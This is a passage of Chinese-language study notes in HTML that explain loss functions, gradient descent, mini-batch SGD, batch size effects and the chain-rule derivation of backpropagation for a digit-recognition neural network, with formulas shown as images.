<p>训练的过程实际上在寻找某个函数的（局部）最小值</p>  </li>  <li>    <p>在训练开始前，这些参数是随机初始化的</p>    <blockquote>      <p>确实存在一些随机初始化的策略，但目前来看，都只是“锦上添花”</p>    </blockquote>  </li></ul><h2 id="2-1-损失函数-loss-function">2.1. 损失函数（Loss Function）</h2><ul>  <li>    <p>显然，随机初始化不会有多好的表现</p>  </li>  <li>    <p>此时需要定义一个“<strong>损失函数</strong>”来告诉计算机：正确的输出应该只有标签对应的那个神经元是被激活的</p>  </li>  <li>    <p>比如这样定义单个样本的损失：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702194825.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702195301.png" alt=""></p>    <ul>      <li>当网络分类正确时，这个值就越小</li>      <li>这里使用的损失函数为“均方误差”（mean-square error, MSE）</li>    </ul>  </li>  <li>    <p>现在，我们就可以用<strong>所有训练样本</strong>的平均损失来评价整个网络在这个任务上的“<strong>糟糕程度</strong>”</p>    <blockquote>      <p>在实践中，并不会每次都使用所有训练样本的平均损失来调整梯度，这样计算量太大了</p>      <p>随机梯度下降</p>    </blockquote>  </li></ul><p>实际上，<strong>神经网络学习的过程，就是最小化损失函数的过程</strong></p><p><strong>神经网络与损失函数的关系</strong></p><ul>  <li>    <p>神经网络本身相当于一个函数</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702195902.png" alt=""></p>    <blockquote>      <p>输入是一个向量，输出是一个向量，参数是所有权重和偏置</p>    </blockquote>  </li>  <li>    <p>损失函数在神经网络的基础上，还要再抽象一层：</p>    <p>所有权重和偏置作为它的输入，输出是单个数值，表示当前网络的性能；参数是所有训练样例（？）</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702201513.png" alt=""></p>  </li>  <li>    <p>从这个角度看，损失函数并不是神经网络的一部分，而是训练神经网络时需要用到的工具</p>  </li></ul><h2 id="2-2-梯度下降法-gradient-descent">2.2. 梯度下降法（Gradient Descent）</h2><p><strong>如何优化这些网络参数？</strong></p><ul>  <li>能够判断网络的“糟糕程度”并不重要，关键是如何利用它来<strong>优化</strong>网络参数</li></ul><p><strong>示例 1：考虑只有一个参数的情况</strong></p><ul>  <li>    <p>如果函数只有一个极值点，那么直接利用微积分即可</p>    <p>如果函数很复杂的话，问题就不那么直接了，更遑论上万个参数的情况</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702202810.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702203041.png" alt=""></p>  </li>  <li>    <p><strong>一个启发式的思路是</strong>：先随机选择一个值，然后考虑向左还是向右，函数值会减小；</p>    <p>准确的说，如果你找到了函数在该点的斜率，<strong>斜率为正就向左移动一小步，反之向右</strong>；</p>    <p>然后每新到一个点就重复上述过程——计算新的斜率，根据斜率更新位置；</p>    <p>最后，就可能逼近函数的某个<strong>局部极小值</strong>点</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702203401.png" alt=""></p>  </li>  <li>    <p>这个想法最明显的问题是：由于无法预知最开始的值在什么位置，导致最终会到达不同的局部极小值；</p>    <p>关键是无法保证落入的局部极小值就是损失函数可能达到的全局最小值；</p>    <p>这也是神经网络最大的问题：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702204047.png" alt=""></p>  </li></ul><p><strong>示例 2：考虑两个参数的情况</strong></p><ul>  <li>    <p>输入空间是一个 XY 平面，代价函数是平面上方的曲面</p>    <p>此时的问题是：在输入空间沿哪个方向移动，能使输出结果下降得最快</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702210202.png" alt=""></p>  </li>  <li>    <p>如果你熟悉<strong>多元微积分</strong>，那么应该已经有了答案：</p>    <p>函数的<strong>梯度</strong>指出了函数的“<strong>最陡</strong>”增长方向，即沿着梯度的方向走，函数增长最快；</p>    <p>换言之，<strong>沿梯度的负方向走，函数值也就下降得最快</strong>；</p>    <p>此外，梯度向量的长度还代表了斜坡的“陡”的程度。</p>  </li>  <li>    <p>处理更多的参数也是同样的办法，</p>    <p>这种<strong>按照负梯度的倍数</strong>，不断调整函数输入值的过程，就叫作梯度下降法</p>  </li>  <li>    <p>直观来看，梯度下降法能够让函数值收敛到损失函数图像中的某一个“坑”中</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703102940.png" alt=""></p>  </li></ul><h3 id="2-2-1-理解梯度下降法的另一种思路">2.2.1. 理解梯度下降法的另一种思路</h3><ul>  <li>    <p>梯度下降法的一般处理方式：</p>    <ul>      <li>        <p>将所有网络参数放在一个列向量中，那么损失函数的负梯度也是一个向量</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703103735.png" alt=""></p>      </li>    </ul>  </li>  <li>    <p>负梯度中的每一项实际传达了两个信息</p>    <ol>      <li>        <p>正负号在告诉输入向量应该调大还是调小——因为是<strong>负梯度</strong>，所以正好对应调大，负号调小</p>      </li>      <li>        <p>每一项的相对大小表明每个输入值对函数值的影响程度；换言之，也就是调整各权重对于网络的影响</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703103757.png" alt="">          <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703104845.png" alt=""></p>      </li>    </ol>  </li>  <li>    <p>宏观来看，可以把梯度向量中的每个值理解为各参数（权重和偏置）的相对重要度，</p>    <p>同时指出了改变其中哪些参数的<strong>性价比</strong>最高</p>  </li>  <li>    <p>这个理解思路同样可以反馈到图像中</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703105249.png" alt=""></p>    <ul>      <li>        <p>一种思路是在点 <code>(1,1)</code> 处沿着 <code>[3,1]</code> 方向移动，函数值增长最快</p>      </li>      <li>        <p>另一种解读就是变量 <code>x</code> 的重要性是 <code>y</code> 的三倍；</p>        <p>也就是说，至少在这个点附近，改变 <code>x</code> 会造成更大的影响</p>      </li>    </ul>  </li></ul><p><strong>梯度下降法</strong>描述：</p><ol>  <li>计算损失函数对所有参数的（负）梯度</li>  <li>按梯度的负方向下降一定步长（直接加上负梯度）</li>  <li>重复以上步骤，直到满足精度要求</li></ol><ul>  <li>其中计算梯度的算法是整个神经网络的核心</li></ul><p><strong>梯度下降法</strong>与<strong>反向传播算法</strong></p><ul>  <li>    <p>梯度下降法是寻找局部最小值的一种<strong>策略</strong></p>    <p>其中最核心的部分利用<strong>损失函数 <code>L(θ)</code> 的梯度</strong>来更新所有参数 <code>θ</code></p>  </li>  <li>    <p><strong>反向传播算法</strong>是求解函数梯度的一种方法；</p>    <p>其本质上是利用<strong>链式法则</strong>对每个参数求偏导</p>  </li></ul><p><strong>损失函数的平滑性</strong></p><ul>  <li>    <p>为了能达到函数的局部最小值，损失函数有必要是<strong>平滑</strong>的</p>    <p>只有如此，损失函数才能基于梯度下降的方法，找到一个局部最小值</p>  </li>  <li>    <p>这也解释了为什么要求神经元的激活值是连续的</p>    <blockquote>      <p>生物学中的神经元是二元式的</p>    </blockquote>  </li></ul><h3 id="2-2-2-随机梯度下降-stochastic-gradient-descent">2.2.2. 随机梯度下降（Stochastic Gradient Descent）</h3><ul>  <li>    <p>基本的梯度下降法要求每次使用<strong>所有训练样本</strong>的平均损失来更新参数，也称为“<strong>批量梯度下降</strong>”</p>    <p>原则上是这样，但是为了<strong>计算效率</strong>，实践中并不会这么做</p>  </li>  <li>    <p>一种常用的方法是每次只随机选取<strong>单个样本</strong>的损失来计算梯度，该方法称为“<strong>随机梯度下降</strong>”（Stochastic Gradient Descent, SGD），它比批量梯度下降法要快得多</p>  </li>  <li>    <p>但更常用的方法是<strong>小批量梯度下降</strong>，它每次随机选取<strong>一批样本</strong>，然后基于它们的平均损失来更新参数</p>  </li>  <li>    <p>SGD 与 小批量梯度下降的优势在于：它们的计算复杂度与训练样本的数量无关</p>    <blockquote>      <p>很多情况下，并不区分 SGD 和小批量梯度下降；有时默认 SGD 就是小批量梯度下降，比如本视频</p>    </blockquote>  </li></ul><p><strong>批大小的影响</strong>：</p><ul>  <li>    <p><strong>较大的批能得到更精确的梯度估计</strong>，但回报是小于线性的。</p>  </li>  <li>    <p><strong>较小的批能带来更好的泛化误差</strong>，泛化误差通常在批大小为 1 时最好。但是，因为梯度估计的高方差，小批量训练需要<strong>较小的学习率</strong>以保持稳定性，这意味着<strong>更长的训练时间</strong>。</p>    <blockquote>      <p>原因可能是由于小批量在学习过程中加入了噪声，它们会有一些正则化效果 (Wilson and Martinez, 2003)</p>    </blockquote>  </li>  <li>    <p><strong>内存消耗和批的大小成正比</strong>，当批量处理中的所有样本可以并行处理时。</p>  </li>  <li>    <p>在某些硬件上使用特定大小可以减少运行时间。尤其是在使用 GPU 时，通常使用 <strong>2 的幂数</strong>作为批量大小可以获得更少的运行时间。一般，2 的幂数的<strong>取值范围是 32 到 256</strong>，16 有时在尝试大模型时使用。</p>  </li></ul><p><strong>神经网络的优化难题</strong></p><ul>  <li>    <p>有一个策略可以保证最终解<strong>至少</strong>能到达一个局部极小值点：使每次<strong>移动的步幅和斜率成正比</strong>；</p>    <p>因为在最小值附近的斜率会趋于平缓，这将导致每次移动步幅越来越小，防止跳出极值点</p>    <p><strong>但是</strong>，这对于现代各种巨大的神经网络而言，是一个<strong>负优化策略</strong>——它反而会<strong>限制网络的学习</strong>，导致其陷入某个局部极小值点</p>  </li>  <li>    <p>当参数数量非常庞大时，可能存在<strong>无数个极值点</strong>，而其中某些极值点的结果可能非常差。</p>    <blockquote>      <p>优化问题是深度学习最核心的两个问题之一，另一个是正则化</p>    </blockquote>  </li>  <li>    <p>也不要太过担心因为局部最小值点太多而无法优化；</p>    <p>事实上，只要你使用的数据不是完全随机，或者说有一定结构，那么最终网络倾向收敛到的各个局部最小值点，实际上都差不多</p>    <p>你可以认为如果数据集已经<strong>结构化</strong>了，那么你可以更轻松的找到局部最小值点</p>    <blockquote>      <p>[1412.0233] The Loss Surfaces of Multilayer Networks <a href="https://arxiv.org/abs/1412.0233" target="_blank" rel="noopener">https://arxiv.org/abs/1412.0233</a></p>    </blockquote>  </li></ul><h2 id="2-3-再谈神经网络的运作机制">2.3. 再谈神经网络的运作机制</h2><ul>  <li>    <p>我们对神经网络的<strong>期望</strong>是：</p>    <p>第一个隐藏层能够识别短边，第二个隐藏层能够将短边拼成圆圈等基本笔画，最后将这些部件拼成数字</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702094455.png" alt=""></p>  </li>  <li>    <p>利用<strong>权重与所有输入像素对应相乘</strong>的方法，可以还原每个神经元对应的图案</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703115843.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703115823.png" alt=""></p>    <blockquote>      <p>期望（左）与现实（右）</p>    </blockquote>  </li>  <li>    <p>事实上，与其说它们能识别各种散落的短边，它们不过都是一些松散的图案</p>    <p>就像“在如深海般的 13000 维参数空间中，找到了一个不错的局部最小值位置住了下来”</p>    <p>尽管它们能成功识别大部分手写数字，但它不像我们期望的能识别各种图案的基本部件</p>  </li>  <li>    <p>一个明显的例子：传入一张随机的图案</p>    <p>如果神经网络真的很“智能”，它应该对这个输入感到困惑——10个输出单元都没有明确的激活值</p>    <p>但实际上，它总会会给出一个确切的答案</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703121303.png" alt=""></p>    <blockquote>      <p>它能将一张真正的 “5” 识别成 5，也能把一张随机的噪声识别成 5</p>    </blockquote>  </li>  <li>    <p>或者说，这个神经网络<strong>知道怎么识别数字，但它不知道怎么写数字</strong></p>    <p>原因可能是，很大程度上它的训练被限制在了一个很窄的框架内；</p>    <p>“从神经网络的视角来看，整个世界都是由网络内清晰定义的静止数字组成的，它的损失函数只会促使它对最后的判断有绝对的自信。”</p>  </li>  <li>    <p>有一些观点认为，神经网络/深度学习并没有那么智能，它只是<strong>记住了所有正确分类的数据</strong>，然后<strong>尽量</strong>把那些跟训练数据类似的数据分类正确</p>  </li>  <li>    <p>但是，有些观点认为神经网络确实学到了某些更智能的东西：</p>    <p>如果训练时使用的是随机的数据，那么损失函数的下降会很慢，而且是接近线性的过程；也就是说网络很难找到可能存在的局部最小值点；</p>    <p>但如果你使用了<strong>结构化</strong>的数据，虽然一开始的损失会上下浮动，但接下来会快速下降；也就是很容易就找到了某个局部最小值——这表明神经网络能更快学习<strong>结构化的数据</strong>。</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703143800.png" alt=""></p>  </li></ul><h2 id="2-4-推荐阅读">2.4. 推荐阅读</h2><ul>  <li>Neural Networks and Deep Learning: <a href="http://neuralnetworksanddeeplearning.com/" target="_blank" rel="noopener">http://neuralnetworksanddeeplearning.com/</a></li>  <li>Chris Olah’s blog: <a href="http://colah.github.io/" target="_blank" rel="noopener">http://colah.github.io/</a>    <ul>      <li><a href="http://colah.github.io/posts/2014-03-NN-Manifolds-Topology/" target="_blank" rel="noopener">Neural Networks, Manifolds, and Topology</a></li>      <li><a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs/" target="_blank" rel="noopener">Understanding LSTM Networks</a></li>    </ul>  </li>  <li>Distill — Latest articles about machine learning <a href="https://distill.pub/" target="_blank" rel="noopener">https://distill.pub/</a></li>  <li>Videos on machine learning:    <ul>      <li>Learning To See [Part 1: Introduction] - YouTube <a href="https://www.youtube.com/watch?v=i8D90DkCLhI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=i8D90DkCLhI</a></li>      <li>Neural Networks Demystified [Part 1: Data and Architecture] - YouTube <a href="https://www.youtube.com/watch?v=bxe2T-V8XRs" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bxe2T-V8XRs</a></li>    </ul>  </li></ul><h1>3. 反向传播算法（Backpropagation Algorithm, BP）</h1><h2 id="3-1-反向传播的直观理解">3.1. 反向传播的直观理解</h2><ul>  <li>    <p>梯度下降法中需要用到损失函数的梯度来决定下降的方向，</p>    <p>其中 BP 算法正是用于求解这个复杂梯度的一种方法</p>  </li>  <li>    <p>在阐述 BP 算法之前，记住——</p>    <p><strong>梯度向量中的每一项不光告诉我们每个参数应该增大还是减小，还指示了调整每个参数的“性价比”</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703103757.png" alt=""></p>  </li></ul><p><strong>示例：单个训练样本对参数调整的影响</strong></p><ul>  <li>    <p>假设现在的网络还没有训练好，那么输出层的激活值看起来会很随机</p>    <p>而我们希望的输出应该是正确类别对应的输出值最大，其他尽可能接近 0</p>    <p>因此，我们希望正确类别对应的激活值应该增大，而其他都减小</p>    <blockquote>      <p>需要注意的是，激活值是由输入值和权重及偏置决定的；网络不会调整激活值本身，只能改变权重和偏置</p>    </blockquote>  </li>  <li>    <p>一个简单的<strong>直觉</strong>是：激活值<strong>变动的幅度</strong>应该与<strong>当前值和目标值之间的误差</strong>成正比</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703210401.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180703210941.png" alt=""></p>    <blockquote>      <p>我们希望第三个输出值增大，其他减小</p>      <p>显然，这里增加 “2” 的激活值比减少 “8” 的激活值更重要；因为后者已经接近它的目标了</p>    </blockquote>  </li>  <li>    <p>激活值的计算公式指明了调整的方向</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704095607.png" alt=""></p>  </li>  <li>    <p>以 “2” 对应的神经元为例，如果需要<strong>增大当前激活值</strong>，可以：</p>    <ol>      <li>增大偏置</li>      <li>增大权重</li>      <li>调整上一层的激活值</li>    </ol>    <blockquote>      <p>如果使用的是 <code>sigmoid</code> 或 <code>ReLU</code> 作为激活函数，那么激活值都 <code>≥ 0</code>；但无论激活值正负，都是类似的调整方法</p>    </blockquote>  </li></ul><p><strong>如何调整权重和偏置？</strong></p><ul>  <li>    <p>偏置只关注当前神经元，因此，可以正比于当前值和目标值之间的差来调整偏置</p>  </li>  <li>    <p>权重指示了连接的强弱；换言之，与之相连的上层激活值越大，那么该权重对当前神经元的影响也越大。显然，着重调整这个参数的性价比更高</p>    <p>因此，可以正比于与之关联的上层激活值来调整权重</p>  </li>  <li>    <p>这种学习的<strong>偏好</strong>将导致这样一个结果——<strong>一同激活的神经元被关联在一起</strong>；生物学中，称之为“赫布理论”（Hebbian theory）</p>    <p>这在深度学习中，并不是一个广泛的结论，只是一个粗略的对照；事实上，早期的神经网络确实在模仿生物学上大脑的工作；但深度学习兴起之后，其指导思想已经发生了重要转变——<strong>组合表示</strong></p>  </li></ul><p><strong>如何改变上层激活值？</strong></p><ul>  <li>    <p>因为权重带有正负，所以如果希望增大当前激活值，应该使所有通过<strong>正权</strong>连接的上层激活值增大，所有通过<strong>负权</strong>连接的上层激活值减小</p>  </li>  <li>    <p>类似的，与修改权重时类似，如果想造成更大的影响，应该对应权重的大小来对激活值做出<strong>成比例</strong>的改变；</p>    <p>但需要注意的是，上层激活值的大小也是由上层的权重和偏置决定的，</p>  </li>  <li>    <p>所以更准确的说法是，每层的权重和偏置会根据下一层的权重和偏置来做出成比例的改变，而最后一层的权重个偏置会根据<strong>当前值和目标值之间的误差</strong>来成比例调整</p>  </li></ul><p><strong>反向传播</strong></p><ul>  <li>    <p>除了需要增大正确的激活值，同时还要减小错误的。而这些神经元对于如何改变上一层的激活值都有各自的想法；</p>    <p>因此，需要将这些神经元的期待全部相加，作为改变上层神经元的指示；</p>    <p>这些期待变化，不仅对应权重的倍数，也是每个神经元激活值改变量的倍数。</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704111141.png" alt=""></p>  </li>  <li>    <p>这其实就是在实现“反向传播”的理念了——</p>    <p>将所有期待的改变相加，就得到了希望对上层改动的变化量；然后就可以重复这个过程，直到第一层</p>  </li>  <li>    <p>上面只是讨论了单个样本对所有参数的影响，实践时，需要同时考虑每个样本对权重与偏置的修改，然后将它们期望的平均作为每个参数的变化量；</p>    <p>不严格的来说，这就是梯度下降中的需要的“<strong>负梯度</strong>”</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704111911.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704112743.png" alt=""></p>    <blockquote>      <p><code>η</code> 表示倍数</p>    </blockquote>  </li></ul><h3 id="3-1-1-bp-算法小结">3.1.1. BP 算法小结</h3><ul>  <li>    <p>反向传播算法计算的是<strong>单个训练样本</strong>对所有权重和偏置的调整——包括每个参数的正负变化以及<strong>变化的比例</strong>——使其能最快的降低损失。</p>  </li>  <li>    <p>真正的梯度下降需要对训练集中的每个样本都做一次反向传播，然后计算平均变化值，继而更新参数。</p>    <p>但这么操作会导致算法的复杂度与训练样本的数量相关。</p>  </li>  <li>    <p>实践时，会采用“<strong>随机梯度下降</strong>”的策略：</p>    <ol>      <li>首先打乱所有样本；</li>      <li>然后将所有样本分发到各个 mini-batch 中；</li>      <li>计算每个 mini-batch 的梯度，调整参数</li>      <li>循环至 Loss 值基本不再变化</li>    </ol>    <p>最终神经网络将会收敛到某个局部最小值上</p>  </li></ul><h3 id="3-1-2-相关代码">3.1.2. 相关代码</h3><ul>  <li>mnielsen/neural-networks-and-deep-learning/<a href="https://github.com/mnielsen/neural-networks-and-deep-learning/blob/master/src/network.py" target="_blank" rel="noopener">network.py</a></li></ul><h2 id="3-2-反向传播的微积分原理">3.2. 反向传播的微积分原理</h2><p>从数学的角度看，反向传播本质上就是<strong>利用链式法则求导</strong>的过程；</p><p>本节的目标是展示机器学习领域是如何理解链式法则的。</p><h3 id="3-2-1-示例：每层只有一个神经元的网络">3.2.1. 示例：每层只有一个神经元的网络</h3><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704161115.png" alt=""></p><ul>  <li>    <p>从最后两个神经元开始：</p>    <p>记最后一个神经元的激活值为 <code>a^(L)</code> 表示在第 L 层，上层的激活值为 <code>a^(L-1)</code>；</p>    <p>给定一个训练样本，其目标值记为 <code>y</code>；</p>    <p>则该网络对于单个训练样本的损失，可以表示为：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704193558.png" alt=""></p>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704162743.png)](http://www.codecogs.com/eqnedit.php?latex=C_0(\theta)=(a^{(L)}-y)^2)>`θ` 为代价函数的参数，表示网络中所有权值和偏置 -->    <p>其中</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704193742.png" alt=""></p>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704163428.png)](http://www.codecogs.com/eqnedit.php?latex=a^{(L)}=\sigma(w^{(L)}a^{(L-1)}&plus;b^{(L)})) -->    <p>为了方便，记加权和为 <code>z</code>，于是有</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704193955.png" alt=""></p>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704163659.png)](http://www.codecogs.com/eqnedit.php?latex=z^{(L)}=w^{(L)}a^{(L-1)}&plus;b^{(L)}) -->  </li>  <li>    <p>整个流程可以概括为：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704164022.png" alt=""></p>    <ul>      <li>先使用前一个激活值和权重 <code>w</code> 以及偏置 <code>b</code> 计算出 <code>z</code></li>      <li>再将 <code>z</code> 传入激活函数计算出 <code>a</code></li>      <li>最后利用 <code>a</code> 和目标值 <code>y</code> 计算出损失</li>    </ul>  </li>  <li>    <p>我们的目标是理解<strong>代价函数对于参数的变化有多敏感</strong>；</p>    <p>从微积分的角度来看，这实际上就是在<strong>求损失函数对参数的导数</strong>。</p>  </li>  <li>    <p>以 <code>w^(L)</code> 为例，求 <code>C</code> 对 <code>w^(L)</code>的（偏）导数，记作：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704194111.png" alt=""></p>    <blockquote>      <p>把 <code>∂w^(L)</code> 看作对 <code>w</code> 的微小扰动，比如 0.001；把 <code>∂C</code> 看作“<strong>改变 <code>w</code> 对 <code>C</code> 造成的变化</strong>”</p>    </blockquote>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704170039.png)](http://www.codecogs.com/eqnedit.php?latex=\frac{\partial&space;C_0}{\partial&space;w^{(L)}}) -->    <p>这实际上就是在计算 <code>C</code> 对 <code>w^(L)</code> 的微小变化有多敏感；</p>  </li>  <li>    <p>根据链式法则，有</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704194548.png" alt=""></p>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704170404.png)](http://www.codecogs.com/eqnedit.php?latex=\frac{\partial&space;C_0}{\partial&space;w^{(L)}}=\frac{\partial&space;C_0}{\partial&space;a^{(L)}}\frac{\partial&space;a^{(L)}}{\partial&space;z^{(L)}}\frac{\partial&space;z^{(L)}}{\partial&space;w^{(L)}}) -->  </li>  <li>    <p>进一步分解到每个比值，有</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704194635.png" alt=""></p>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704171334.png)](http://www.codecogs.com/eqnedit.php?latex=\begin&space;{aligned}&space;\frac{\partial&space;C_0}{\partial&space;w^{(L)}}&space;&=\frac{\partial&space;C_0}{\partial&space;a^{(L)}}\frac{\partial&space;a^{(L)}}{\partial&space;z^{(L)}}\frac{\partial&space;z^{(L)}}{\partial&space;w^{(L)}}\\&space;&=2(a^{(L)}-y)\cdot&space;\sigma%27(z^{(L)})\cdot&space;a^{(L-1)}&space;\end{aligned}) -->  </li>  <li>    <p>类似的，对偏置的偏导：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704194726.png" alt=""></p>    <p>对上层激活值的偏导：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704200743.png" alt=""></p>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704173348.png)](http://www.codecogs.com/eqnedit.php?latex=\begin&space;{aligned}&space;\frac{\partial&space;C_0}{\partial&space;b^{(L)}}&space;&=\frac{\partial&space;C_0}{\partial&space;a^{(L)}}\frac{\partial&space;a^{(L)}}{\partial&space;z^{(L)}}\frac{\partial&space;z^{(L)}}{\partial&space;b^{(L)}}\\&space;&=2(a^{(L)}-y)\cdot&space;\sigma%27(z^{(L)})\cdot&space;1&space;\end{aligned}) -->    <!-- [![](http://www.meng.uno/images/assets/公式_20180704173511.png)](http://www.codecogs.com/eqnedit.php?latex=\begin&space;{aligned}&space;\frac{\partial&space;C_0}{\partial&space;a^{(L-1)}}&space;&=\frac{\partial&space;C_0}{\partial&space;a^{(L)}}\frac{\partial&space;a^{(L)}}{\partial&space;z^{(L)}}\frac{\partial&space;z^{(L)}}{\partial&space;a^{(L-1)}}\\&space;&=2(a^{(L)}-y)\cdot&space;\sigma%27(z^{(L)})\cdot&space;w^{(L)}&space;\end{aligned}) -->  </li>  <li>    <p>更上层的权重与偏置也是类似的方法，只是链的长度会更长而已</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704174134.png" alt=""></p>  </li>  <li>    <p>一个直观的理解，考虑将它们分别对应到一个数轴上；</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704165624.png" alt=""></p>    <ul>      <li><code>w^(L)</code> 的微小变化会导致 <code>z^(L)</code> 的微小变化</li>      <li><code>z^(L)</code> 的微小变化会导致 <code>a^(L)</code> 的微小变化</li>      <li><code>a^(L)</code> 的微小变化最终会影响到损失值 <code>C</code></li>      <li>反向传播的过程就是将 <code>C</code> 的微小变化传回去</li>    </ul>  </li>  <li>    <p>以上只是单个训练的损失对 <code>w^(L)</code> 的导数，实践中需要求出一个 mini-batch 中所有样本的平均损失</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704194944.png" alt=""></p>    <!-- [![](http://www.meng.uno/images/assets/公式_20180704171742.png)](http://www.codecogs.com/eqnedit.php?latex=\begin&space;{aligned}&space;\frac{\partial&space;C}{\partial&space;w^{(L)}}=\frac{1}{n}\sum^{n-1}_{k=0}\frac{\partial&space;C_k}{\partial&space;w^{(L)}}&space;\end{aligned}) -->  </li>  <li>    <p>进一步的，<code>∂C/∂w^(L)</code> 只是梯度向量 <code>▽C</code> 的一个分量；</p>    <p>而梯度向量本身有损失函数对每个参数的偏导构成：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704172524.png" alt=""></p>  </li></ul><blockquote>  <p>本系列视频称损失函数为“代价函数”，所以使用 <code>C</code> 表示代价（Cost）；更多会用 <code>L</code> 表示损失（Loss）；二者没有区别，但这里已经使用 L 表示网络的层数，所以使用 <code>C</code> 表示损失函数</p></blockquote><h3 id="3-2-2-更复杂的示例">3.2.2. 更复杂的示例</h3><ul>  <li>    <p>更复杂的神经网络在公式上并没有复杂很多，只有少量符号的变化</p>  </li>  <li>    <p>首先，利用<strong>下标</strong>来区分同一层不同的神经元和权重</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704195120.png" alt=""></p>    <p>以下的推导过程几乎只是符号的改变：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704195859.png" alt=""></p>    <p>然后求偏导：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704200316.png" alt=""></p>    <p>唯一改变的是，对 <code>(L-1)</code> 层的偏导：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180704200453.png" alt=""></p>    <blockquote>      <p>此时激活值可以通过不同的途径影响损失函数</p>    </blockquote>    <p>只要计算出倒数第二层损失函数对激活值的敏感度，就可以重复以上过程，计算喂给倒数第二层的权重和偏置。</p>  </li>  <li>    <p>事实上，如果都使用矢量表示，那么整个推导公式跟单神经元的网络几乎是完全一样的</p>  </li>  <li>    <p>链式法则给出了决定梯度每个分量的偏导，使我们能不断下探，最小化神经网络的损失。</p>  </li></ul><h3 id="3-2-3-反向传播的-4-个基本公式">3.2.3. 反向传播的 4 个基本公式</h3><ul>  <li>    <p><strong>问题描述</strong>：</p>    <p>反向传播算法的目标是求出损失函数<strong>对所有参数的梯度</strong>，具体可分解为<strong>对每个权重和偏置的偏导</strong></p>    <p>可以用 4 个公式总结反向传播的过程</p>  </li>  <li>    <p><strong>标量形式</strong>：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705190236.png" alt=""></p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705134851.png" alt="">      <img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705154543.png" alt="">      <img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705154650.png" alt=""></p>    <blockquote>      <p>其中，上标 <code>(l)</code> 表示网络的层次，<code>(L)</code> 表示输出层（最后一层）；下标 <code>j</code> 和 <code>k</code> 指示神经元的位置；</p>      